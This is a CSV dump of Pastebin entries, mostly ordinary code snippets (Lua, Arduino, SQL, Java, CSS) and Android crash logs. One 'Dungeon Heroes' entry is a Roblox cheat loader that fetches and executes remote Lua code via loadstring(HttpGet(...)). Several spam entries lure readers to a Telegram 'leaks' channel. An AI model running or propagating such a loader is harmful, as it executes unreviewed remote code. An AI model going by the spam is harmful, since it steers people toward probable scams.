id,title,username,language,date,content
4K1gQe1M,Computercraft Logging API,Pastebin_Paster,Lua,Wednesday 14th of May 2025 06:14:26 AM CDT,"--Variables
logFile = ""logFile.lua""
logShowProgram = false
logShowClearedMessage = true

logTimestampFormat = ""[%s]""
logDateTimeFormat = ""%F %R""
logProgramFormat = ""[%s]""
logClearedMessage = ""--LOG CLEARED--""
currentRunningProgram = nil

--Functions
function filePath(path) logFile = tostring(path) end
function setShowProgram(var) logShowProgram = var end
function setShowClearedMessage(setVar) logShowClearedMessage = setVar end
function setCurrentProgram(setvar) currentRunningProgram = setvar end
function setClearedMessage(message) logClearedMessage = tostring(message) end
function setProgramFormat(pFormat) logProgramFormat = pFormat end
function setTimestampFormat(tFormat) logTimestampFormat = tFormat end
function setDateTimeFormat(dFormat) logDateTimeFormat = dFormat end

function reset() 
    logFile = ""logFile.lua""
    logShowProgram = false
    logShowClearedMessage = true

    logTimestampFormat = ""[%s]""
    logDateTimeFormat = ""%F %R""
    logProgramFormat = ""[%s]""
    logClearedMessage = ""--LOG CLEARED--""
    currentRunningProgram = nil
end

function output(statement)
    timeString = string.format(logTimestampFormat, os.date(logDateTimeFormat))
    programString = string.format(logProgramFormat, currentRunningProgram)

    file = fs.open(logFile, ""a"")
    if logShowProgram == true then
        file.write(timeString..programString.."": ""..tostring(statement)..""\n"")
    else
        file.write(timeString.."": ""..tostring(statement)..""\n"")
    end
    file.close()
end

function clear()
    timeString = string.format(logTimestampFormat, os.date(logDateTimeFormat))
    programString = string.format(logProgramFormat, currentRunningProgram)

    file = fs.open(logFile, ""w"")
    if logShowProgram == true and logShowClearedMessage == true then
        file.write(timeString..programString.."": ""..tostring(logClearedMessage)..""\n"")
    elseif logShowClearedMessage == true then
        file.write(timeString.."": ""..tostring(logClearedMessage)..""\n"")
    end
    file.close()
end"
H16pDf60,❤️private mehtod C4,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:14:12 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

iH7h6Ihhw9
"
B8KZcXtf,telegram leaks EQ,sagorpm,JavaScript,Wednesday 14th of May 2025 06:12:27 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

a1iXiRBvsJ
"
hrknmuWd,private mehtod NH,Trxpkingj,JavaScript,Wednesday 14th of May 2025 06:10:25 AM CDT," 
check it out at t.me/LucasL3AK/15  

iFvVNpH77C
"
BHG1QfGh,dataNone,TestGuy1,JSON,Wednesday 14th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '22593c7cb4b8f16fd2082b5a5bc121935553edb6d79c1f86e1a8ca57eaabe12c595b1852e0ec234bb897d2f328c1c304ce90d8621b7b12b73c8b2fc7eac39dd1e2640c018e00748f105dadebb18c3be4f8e4d5e2ac62964d9679505785f56225e5ef723f8c2b5cd261b79e752304eda48a77d01d214079eab215795a71a0cb2b',
  otherdata: [
    '4222ba4eed021eb3ee923e0a56d82889',
    '5662c4fecfad82df142d03d1b3b29756',
    'a4bdd3c63dbf4a6ea2e6c340e15dd409',
    '4035c0cfe57e27b6f312d2c4f4fe51f7',
    '7f8a8b1cc21ecf053990d6afe4d9f0c2',
    '1fbe1cd468d8c92613fb4796dd9dbc45',
    '2592d825b579128450a79bedbfb7e468',
    'f8404ce887b8d72cf61fc1bbaeda8289'
  ]
}"
J6xvhn4K,kamera.ino,vitareinforce,Arduino,Wednesday 14th of May 2025 05:13:13 AM CDT,"#include ""esp_camera.h""
#include <WiFi.h>

// Pilih model kamera yang sesuai
#define CAMERA_MODEL_AI_THINKER // ESP32-CAM AI-THINKER dengan OV2640
#include ""camera_pins.h""

// WiFi credentials
const char* ssid = ""Megabot"";
const char* password = ""1234567890"";

void startCameraServer();

void setup() {
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  Serial.println();

  // Konfigurasi kamera
  camera_config_t config;
  config.ledc_channel = LEDC_CHANNEL_0;
  config.ledc_timer = LEDC_TIMER_0;
  config.pin_d0 = Y2_GPIO_NUM;
  config.pin_d1 = Y3_GPIO_NUM;
  config.pin_d2 = Y4_GPIO_NUM;
  config.pin_d3 = Y5_GPIO_NUM;
  config.pin_d4 = Y6_GPIO_NUM;
  config.pin_d5 = Y7_GPIO_NUM;
  config.pin_d6 = Y8_GPIO_NUM;
  config.pin_d7 = Y9_GPIO_NUM;
  config.pin_xclk = XCLK_GPIO_NUM;
  config.pin_pclk = PCLK_GPIO_NUM;
  config.pin_vsync = VSYNC_GPIO_NUM;
  config.pin_href = HREF_GPIO_NUM;
  config.pin_sccb_sda = SIOD_GPIO_NUM;
  config.pin_sccb_scl = SIOC_GPIO_NUM;
  config.pin_pwdn = PWDN_GPIO_NUM;
  config.pin_reset = RESET_GPIO_NUM;
  config.xclk_freq_hz = 20000000;
  // config.pixel_format = PIXFORMAT_JPEG; 
  config.pixel_format = PIXFORMAT_RGB565; 
  config.frame_size = FRAMESIZE_QVGA; // Resolusi lebih rendah untuk stabilitas awal
  config.jpeg_quality = 10; // 10 = kualitas medium, 12 = lebih tinggi
  config.fb_count = 1;

  // Inisialisasi kamera
  esp_err_t err = esp_camera_init(&config);
  if (err != ESP_OK) {
    Serial.printf(""❌ Kamera gagal diinisialisasi, error 0x%x\n"", err);
    return;
  }

  // Konfigurasi sensor kamera
  sensor_t *s = esp_camera_sensor_get();
  if (s->id.PID == OV3660_PID) {
    s->set_vflip(s, 1);  // Flip vertikal
    s->set_brightness(s, 1); // Tambah kecerahan
    s->set_saturation(s, -2); // Kurangi saturasi warna
  }

  // Setup WiFi
  WiFi.begin(ssid, password);
  WiFi.setSleep(false);
  Serial.print(""Menghubungkan ke WiFi"");
  
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(""."");
  }
  Serial.println(""\n✅ WiFi Terhubung!"");
  
  // Jalankan server kamera
  startCameraServer();
  
  Serial.print(""📷 Kamera Siap! Buka: http://"");
  Serial.print(WiFi.localIP());
  Serial.println(""/"");
}

void loop() {
  delay(10000); // Loop tidak perlu melakukan apa-apa, server berjalan sendiri
}
"
Ry8XXSEL,Untitled,kirzecy670,MySQL,Wednesday 14th of May 2025 05:01:32 AM CDT,"with 
event_counts AS (
    SELECT 
        ft.uid,
        ft.dt,
        CASE
            WHEN (deviceType = 2 AND appVersion % 2 = 0) THEN 'iOS_Parent'
            WHEN (deviceType = 1 AND appVersion % 2 = 1) THEN 'Android_Parent'
            WHEN (deviceType = 2 AND appVersion % 2 = 1) THEN 'iOS_Child'
            WHEN (deviceType = 1 AND appVersion % 2 = 0) THEN 'Android_Child'
            ELSE 'Unknown'
        END AS platform,
        had_any_payment,
        ft.dt >= pp.full_reg_datetime + interval '30' day as flg_30day_old_user,
        region,
        MAX(ft.action in ('open', 'open_parent_activity', 'open_parent_screen')) AS open,
        COUNT(ft.uid) FILTER (WHERE ft.action in ('open', 'open_parent_activity', 'open_parent_screen')) AS open_count,
        MAX(ft.action = 'feed_opened_full') AS is_feed_opened_full,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'feed_opened_full') AS feed_opened_full_count,
        MAX(ft.action = 'open_function_records') AS is_open_function_records,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'open_function_records') AS  open_records_count,
        MAX(ft.action = 'open_function_noise') AS is_open_function_noise,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'open_function_noise') AS  open_noise_count,
        MAX(ft.action = 'open_function_zones') AS is_open_function_zones,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'open_function_zones') AS  open_zones_count,
        MAX(ft.action = 'open_function_appstat') AS is_open_function_appstat,
        COUNT(ft.uid) FILTER (WHERE ft.action = 'open_function_appstat') AS  open_appstat_count,
        MAX(ft.action IN (
        'open_function_records',
        'open_function_noise',
        'open_function_zones',
        'open_function_appstat'
        )) AS is_any_feature_used
    FROM 
        stat.funnelTrack ft join analytics.parent_properties pp using uid
    WHERE ft.dt >= '2025-04-01'
      AND ft.action IN (
          'open', 'open_parent_activity', 'open_parent_screen',
          'feed_opened_full',
          'open_function_records', 'open_function_noise', 'open_function_zones', 
          'open_function_appstat'
      )
    GROUP BY 1, 2, 3, 4, 5, 6
)

SELECT
dt,
platform,
had_any_payment,
flg_30day_old_user,
region,
    uniq(uid) as total_users,  -- Debug: total users in event_counts
    uniqIf(uid, open) active_users,
    uniqIf(uid, is_any_feature_used) users_with_any_feature,
    uniqIf(uid, is_feed_opened_full) as users_feed_opened, 
    uniqIf(uid, is_open_function_records) as users_records,
    uniqIf(uid, is_open_function_appstat) as users_appstat,
    uniqIf(uid, is_open_function_zones) as users_zones,
    round(users_with_any_feature/active_users, 4) as use_any_feature
FROM event_counts
group by 1, 2, 3, 4, 5
ORDER BY dt"
PYrSeb82,Leetcode problem 4 (Hard) 6ms response 100%accepted,BojidarDosev,Java,Wednesday 14th of May 2025 04:44:25 AM CDT,"import java.util.*;

public class Main {
    public static double findMedianSortedArrays(int[] nums1, int[] nums2) {

        List<Integer> list = new ArrayList<>();
        for (int n : nums1) list.add(n);
        for (int n : nums2) list.add(n);
        Collections.sort(list);

        if(list.size()%2==0){
            return (double)(list.get(list.size()/2-1) + (double)list.get(list.size()/2)) /2;
        }
        else{
            return (double)list.get(list.size()/2);
        }

    }

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        String[] ar1 = sc.nextLine().split("","");
        String[] ar2 = sc.nextLine().split("","");
        int[] nums1 = new int[ar1.length];
        int[] nums2 = new int[ar2.length];
        for (int i = 0; i < nums1.length; i++) {
            nums1[i] = Integer.parseInt(ar1[i]);
        }
        for (int i = 0; i < nums2.length; i++) {
            nums2[i] = Integer.parseInt(ar2[i]);
        }

        System.out.println(findMedianSortedArrays(nums1, nums2));
    }
}"
pKPbDfNG,2025-05-14T12:31:09.690,powerampache,PHP,Wednesday 14th of May 2025 04:31:10 AM CDT,"1.00-68 (68) - DB: 82
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to cloud.afanasko.spb.ru/188.134.10.217 (port 5040) from /10.239.124.115 (port 58432) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:161)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:929)

getSongsFromAlbum() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to cloud.afanasko.spb.ru/188.134.10.217 (port 5040) from /10.239.124.115 (port 58432) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to cloud.afanasko.spb.ru/188.134.10.217 (port 5040) from /10.239.124.115 (port 58432) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
XZris0Sv,Dungeon Heroes⚔️,new2479,Lua,Wednesday 14th of May 2025 03:16:26 AM CDT,"--https://www.youtube.com/@WinPo1R              pls sub 
--discord :      https://discord.gg/mdnJJYbjCh
--key :       Deepworksuper

loadstring(game:HttpGet(""https://raw.githubusercontent.com/powin273/script/refs/heads/main/Dungeon_Heroes.lua"", true))()"
nL8SRZB6,Asli theme: vertically center overlay menu items,artemsemkin,CSS,Wednesday 14th of May 2025 03:13:08 AM CDT,".menu-overlay {
  display: flex;
  flex-direction: column;
  justify-content: center;
}"
PYLjEY6x,2025-05-14T09:38:36.916993,powerampache,PHP,Wednesday 14th of May 2025 02:38:37 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 46582) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 46582) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 46582) after 15000ms\"" }"",""stackTrace"":[]}"
SFE0uURS,2025-05-14T09:38:15.986053,powerampache,PHP,Wednesday 14th of May 2025 02:38:16 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 37808) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 37808) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 37808) after 15000ms\"" }"",""stackTrace"":[]}"
1wpp2A2S,2025-05-14T09:37:40.291041,powerampache,PHP,Wednesday 14th of May 2025 02:37:40 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 44666) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 44666) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 44666) after 15000ms\"" }"",""stackTrace"":[]}"
1SeSL0Fq,2025-05-14T09:34:49.952994,powerampache,PHP,Wednesday 14th of May 2025 02:34:50 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41584) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41584) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41584) after 15000ms\"" }"",""stackTrace"":[]}"
r39utqgJ,2025-05-14T09:34:45.127011,powerampache,PHP,Wednesday 14th of May 2025 02:34:46 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41246) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

getSongsFromAlbum() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41246) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.14.87.113 (port 41246) after 15000ms\"" }"",""stackTrace"":[]}"
